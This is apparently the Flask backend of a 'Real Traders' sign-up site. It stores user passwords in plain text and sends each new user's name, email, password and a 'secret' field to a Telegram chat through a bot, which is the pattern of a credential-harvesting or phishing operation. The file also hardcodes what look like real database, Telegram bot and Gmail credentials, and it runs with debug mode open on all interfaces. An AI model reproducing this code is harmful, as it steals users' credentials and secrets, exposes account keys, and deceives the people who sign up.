from flask import Flask, request, jsonify, render_template
from flask_sqlalchemy import SQLAlchemy
import random
import smtplib
import ssl
from email.message import EmailMessage
import requests
import os

# === CONFIG ===
app = Flask(__name__)

# Database Configuration
app.config["SQLALCHEMY_DATABASE_URI"] = "postgresql://real_traders_user:9hqUS4p6Vx7T4gam40WJ0y8hIUmct9al@dpg-d274k83uibrs73cup0j0-a/real_traders"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

# Application Secrets
BOT_TOKEN = "7271224033:AAH22jbuHkyvJQuiP_HhqMeN9NjADo6J7vk"
CHAT_ID = "-1002826854422"
EMAIL_SENDER = "nonyaneinvestmenttree@gmail.com"
EMAIL_PASSWORD = "qiku gpty uxso ygwi"

verification_codes = {}

# === MODELS ===
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100))
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    experience = db.Column(db.String(100))
    secret = db.Column(db.String(100))

# === ROUTES ===
@app.route("/")
def home():
    return render_template("register.html")

@app.route("/send-code", methods=["POST"])
def send_code():
    data = request.json
    email = data.get("email")

    if User.query.filter_by(email=email).first():
        return jsonify({"message": "❌ This email is already registered."}), 400

    code = str(random.randint(100000, 999999))
    verification_codes[email] = code

    try:
        msg = EmailMessage()
        msg.set_content(f"Your verification code is: {code}")
        msg["Subject"] = "Your Real Traders Verification Code"
        msg["From"] = EMAIL_SENDER
        msg["To"] = email

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)

        return jsonify({"message": "📩 Code sent to your email!"}), 200

    except Exception as e:
        return jsonify({"message": f"❌ Failed to send email: {str(e)}"}), 500

@app.route("/verify-code", methods=["POST"])
def verify_code():
    data = request.json
    email = data.get("email")
    code = data.get("code")

    if verification_codes.get(email) == code:
        return jsonify({"verified": True})
    return jsonify({"verified": False})

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    username = data.get("username")
    email = data.get("email")
    experience = data.get("experience")
    secret = data.get("secret")
    password = data.get("password")

    if User.query.filter_by(email=email).first():
        return jsonify({"status": "failed", "error": "Email already registered"}), 400

    new_user = User(
        username=username,
        email=email,
        password=password,
        experience=experience,
        secret=secret
    )
    db.session.add(new_user)
    db.session.commit()

    message = (
        f"🧠 New Real Trader Registered!\n"
        f"Name: {username}\n"
        f"Email: {email}\n"
        f"Experience: {experience}\n"
        f"Secret: {secret}\n"
        f"Password: {password}"
    )

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}

    try:
        requests.post(url, json=payload)
    except Exception:
        pass

    return jsonify({"status": "sent"}), 200

@app.route("/login", methods=["POST"])
def login():
    data = request.json
    email = data.get("email")
    password = data.get("password")

    user = User.query.filter_by(email=email, password=password).first()
    if user:
        return jsonify({"status": "success", "username": user.username}), 200
    return jsonify({"status": "failed", "error": "Invalid credentials"}), 401

# === MAIN ===
if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(debug=True, host="0.0.0.0")
